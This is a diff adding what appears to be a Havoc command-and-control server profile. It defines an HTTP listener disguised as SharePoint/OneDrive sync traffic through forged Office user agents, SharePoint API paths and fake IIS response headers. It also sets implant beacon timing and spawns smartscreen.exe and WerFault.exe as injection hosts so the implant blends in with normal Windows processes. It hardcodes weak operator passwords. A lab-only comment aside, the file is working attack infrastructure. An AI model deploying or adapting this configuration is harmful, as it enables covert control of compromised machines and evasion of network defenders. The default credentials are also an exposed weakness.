@@ -1,0 +1,84 @@
+# HTTP Profile
+# Plain HTTP listener masquerading as a SharePoint/OneDrive sync endpoint.
+# Useful for environments where TLS inspection breaks HTTPS callbacks,
+# or when testing without certificate setup.
+# NOTE: Traffic is unencrypted on the wire - use only in lab or when
+# transport encryption is handled at another layer (e.g., VPN, SSH tunnel).
+
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+
+    Build {
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
+        Nasm       = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "operator" {
+        Password = "password1234"
+    }
+
+    user "Neo" {
+        Password = "password1234"
+    }
+
+    user "<YOUR_USERNAME>" {
+        Password = "<YOUR_PASSWORD>"
+    }
+}
+
+Demon {
+    Sleep  = 5
+    Jitter = 20
+
+    TrustXForwardedFor = false
+
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\smartscreen.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\WerFault.exe"
+    }
+}
+
+Listeners {
+    Http {
+        Name         = "HTTP - SharePoint Sync"
+        Hosts        = ["<YOUR_C2_IP>"]
+        HostBind     = "0.0.0.0"
+        HostRotation = "round-robin"
+        PortBind     = 80
+        PortConn     = 80
+        Secure       = false
+        KillDate     = "2026-12-31 23:59:59"
+        UserAgent    = "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17328; Pro)"
+
+        Uris = [
+            "/_api/v2.0/drive/root/delta",
+            "/_api/contextinfo",
+            "/_layouts/15/SPMobileService.ashx",
+        ]
+
+        Headers = [
+            "Accept: application/json;odata=verbose",
+            "Accept-Language: en-US,en;q=0.9",
+            "X-RequestDigest: 0x1A2B3C4D5E6F",
+            "X-ClientService-ClientTag: Office/16.0$Win32",
+        ]
+
+        Response {
+            Headers = [
+                "Content-Type: application/json;odata=verbose;charset=utf-8",
+                "Server: Microsoft-IIS/10.0",
+                "X-SharePointHealthScore: 2",
+                "X-AspNet-Version: 4.0.30319",
+                "X-Powered-By: ASP.NET",
+                "SPRequestGuid: a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+                "request-id: a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+                "X-Content-Type-Options: nosniff",
+                "Connection: keep-alive",
+            ]
+        }
+    }
+}
